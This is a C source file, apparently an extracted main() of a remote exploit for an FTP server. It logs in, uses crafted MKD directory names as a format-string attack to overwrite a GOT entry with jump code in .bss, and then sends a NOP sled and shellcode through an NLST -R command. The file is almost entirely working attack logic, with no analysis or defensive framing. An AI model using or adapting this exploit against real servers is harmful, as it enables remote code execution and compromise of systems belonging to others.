
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int sc ;


 int BSS ;
 int GOT ;
 int MAXPATH ;
 int atoi (char*) ;
 int close (int) ;
 int exit (int) ;
 int fmt (int*,int*,int,char**) ;
 int getopt (int,char**,char*) ;
 int memcpy (char*,char*,int) ;
 int memset (char*,int,int) ;
 char* optarg ;
 int printf (char*,...) ;
 char* s_send (int,char*,char*,...) ;
 char* shellcode ;
 int sock (int,char*) ;
 int * strstr (char*,char*) ;
 char* strtok (char*,char*) ;
 int usage (char*) ;

int main (int argc, char **argv)
{
 int s[2], c, port = 21, pasv[5];
 unsigned int i;
 char *host = ((void*)0), *user = "anonymous", *pass = "", *tmp, *p;
 char mkd[5][MAXPATH], sc[2048];
 int
  got = GOT,
  jmpaddr[] = { BSS, BSS+4, BSS+8 },
  jmpc[] = {
   0x1234ba66,
   0xc2396658,
   0xe4fffa75


  };

 while ((c = getopt(argc, argv, "h:p:u:P:?")) != -1)
 {
  switch (c)
  {
   case 'h':
    host = optarg;
    break;
   case 'p':
    port = atoi(optarg);
    break;
   case 'u':
    user = optarg;
    break;
   case 'P':
    pass = optarg;
    break;
   case '?':
   default:
    usage(argv[0]);
    break;
  }
 }
 if (host == ((void*)0))
  usage(argv[0]);

 printf("[+] GOT: %p - .bss (jmpcode): %p\n", (void *)got, (void *)jmpaddr[0]);
 fmt(jmpaddr, jmpc, got, mkd);

 printf("[+] %s:%d (user: %s pass: %s)\n", host, port, user, pass);
 s[0] = sock(port, host);
 s_send(s[0], "331", "USER %s\n", user);
 p = s_send(s[0], ((void*)0), "PASS %s\n", pass);
 if (strstr(p, "230") == ((void*)0))
 {
  printf("[!] login failed\n");
  exit(1);
 }
 p = s_send(s[0], ((void*)0), "MKD %s\nMKD %s\nMKD %s\n", mkd[0], mkd[1], mkd[2]);
 if (strstr(p, "257") == ((void*)0))
 {
  printf("[!] couldn't make directories\n");
  exit(1);
 }

 printf("[+] PASV\n");
 p = s_send(s[0], "227", "PASV\n");
 if (strtok(p, ",") == ((void*)0))
  exit(1);
 for (i = 0; i < 5; i++)
 {
  if ((tmp = strtok(((void*)0), ",")) == ((void*)0))
  {
   printf("[!] aborting\n");
   exit(1);
  }
  pasv[i] = atoi(tmp);
 }
 s[1] = sock(pasv[3]*256+pasv[4], host);

 printf("[+] writing jumpcode\n");
 s_send(s[0], ((void*)0), "NLST -R\n");
 s_send(s[0], ((void*)0), "RMD %s\nRMD %s\nRMD %s\n", mkd[0], mkd[1], mkd[2]);
 close(s[1]);

 s_send(s[0], ((void*)0), "MKD %s\n", mkd[3]);
 printf("[+] PASV\n");
 p = s_send(s[0], "227", "PASV\n");
 if (strtok(p, ",") == ((void*)0))
  exit(1);
 for (i = 0; i < 5; i++)
 {
  if ((tmp = strtok(((void*)0), ",")) == ((void*)0))
  {
   printf("[!] aborting\n");
   exit(1);
  }
  pasv[i] = atoi(tmp);
 }
 s[1] = sock(pasv[3]*256+pasv[4], host);

 memset(sc, 0x90, sizeof(sc));
 memcpy(sc+3, "\x34\x12", 2);
 memcpy(sc+12, shellcode, sizeof(sc)-12);
 printf("[+] overwriting GOT entry and sending shellcode\n\n");
 s_send(s[0], ((void*)0), "NLST -R%s\n", sc);
 return 0;
}
